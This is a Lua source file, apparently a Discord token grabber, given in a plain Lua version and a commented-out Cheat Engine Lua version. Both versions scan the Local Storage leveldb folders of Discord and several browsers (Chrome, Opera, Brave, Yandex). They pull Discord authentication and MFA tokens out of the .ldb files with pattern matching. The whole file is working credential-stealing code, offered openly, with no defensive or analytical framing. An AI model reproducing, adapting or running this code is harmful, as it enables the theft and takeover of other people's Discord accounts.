-- NORMAL LUA
function get_discord_tokens()
    local roaming=os.getenv('appdata')
    local lappd=os.getenv('localappdata')

    local listDirectory=function(path)
        local get=io.popen('dir "'..path..'" /b'):read('*a'):sub(1, -2)
        local files={}

        for file in get:gmatch('[^\r\n]+') do
            files[#files+1]=path..'\\'..file
        end
        return files
    end

    local PATHS = {
        roaming..'\\Discord',
        roaming..'\\discordcanary',
        roaming..'\\discordptb',
        lappd..'\\Google\\Chrome\\User Data\\Default',
        roaming..'\\Opera Software\\Opera Stable',
        lappd..'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        lappd..'\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    local tokens={}

    -- MAIN
    for _,path in ipairs(PATHS) do
        path=path..'\\Local Storage\\leveldb\\'

        local flist=listDirectory(path)
        if #flist>0 then
            for _,file in ipairs(flist) do
                if file:find('%.ldb') then
                    local open=io.open(file,'rb')
                    local read=open:read('*a')open:close()

                    for ntok in read:gmatch('"[%w-]+%.[%w-]+%.[%w-]+"') do
                        ntok=ntok:sub(2,-2)
                        if #ntok>=59 then
                            tokens[#tokens+1]=ntok
                        end
                    end

                    for mfatok in read:gmatch('"mfa%.[%w-]+"') do
                        mfatok=mfatok:sub(2,-2)
                        if #mfatok>=88 then
                            tokens[#tokens+1]=mfatok
                        end
                    end
                end
            end
        end
    end
    return tokens
end


--[[ CELUA
function get_discord_tokens()
    local roaming=os.getenv('appdata')
    local lappd=os.getenv('localappdata')
    local PATHS = {
        roaming..'\\Discord',
        roaming..'\\discordcanary',
        roaming..'\\discordptb',
        lappd..'\\Google\\Chrome\\User Data\\Default',
        roaming..'\\Opera Software\\Opera Stable',
        lappd..'\\BraveSoftware\\Brave-Browser\\User Data\\Default',
        lappd..'\\Yandex\\YandexBrowser\\User Data\\Default'
    }

    local tokens={}

    -- MAIN
    for _,path in ipairs(PATHS) do
        path=path..'\\Local Storage\\leveldb\\'

        local flist=getFileList(path)
        if #flist>0 then
            for _,file in ipairs(flist) do
                if file:find('%.ldb') then
                    local open=io.open(file,'rb')
                    local read=open:read('*a')open:close()

                    for ntok in read:gmatch('"[%w-]+%.[%w-]+%.[%w-]+"') do
                        ntok=ntok:sub(2,-2)
                        if #ntok>=59 then
                            tokens[#tokens+1]=ntok
                        end
                    end

                    for mfatok in read:gmatch('"mfa%.[%w-]+"') do
                        mfatok=mfatok:sub(2,-2)
                        if #mfatok>=88 then
                            tokens[#tokens+1]=mfatok
                        end
                    end
                end
            end
        end
    end
    return tokens
end
]]